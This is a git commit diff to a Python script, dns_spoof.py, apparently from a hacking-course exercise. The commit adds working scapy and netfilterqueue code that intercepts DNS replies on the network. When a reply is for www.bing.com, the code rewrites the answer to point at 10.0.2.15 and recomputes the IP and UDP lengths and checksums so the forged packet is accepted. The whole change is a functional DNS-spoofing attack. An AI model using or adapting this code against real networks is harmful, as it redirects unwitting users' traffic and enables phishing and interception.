f0294b672c9d600c906accd1a5c4b9e4bdac7574
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-08-24 15:50:50 -0400

    Now with modified packet info

--- dns_spoof.py
+++ dns_spoof.py
@@ -14,10 +14,26 @@ import scapy.all as scapy
 #iptables --flush
 #clear out IP tables
 
+#DNSQR - DNS Question Record
+#DNSRR - DNS Resource Record
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
-        print(scapy_packet.show())
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing target")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
+
+            packet.set_payload(str(scapy_packet))
+        #print(scapy_packet.show())
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
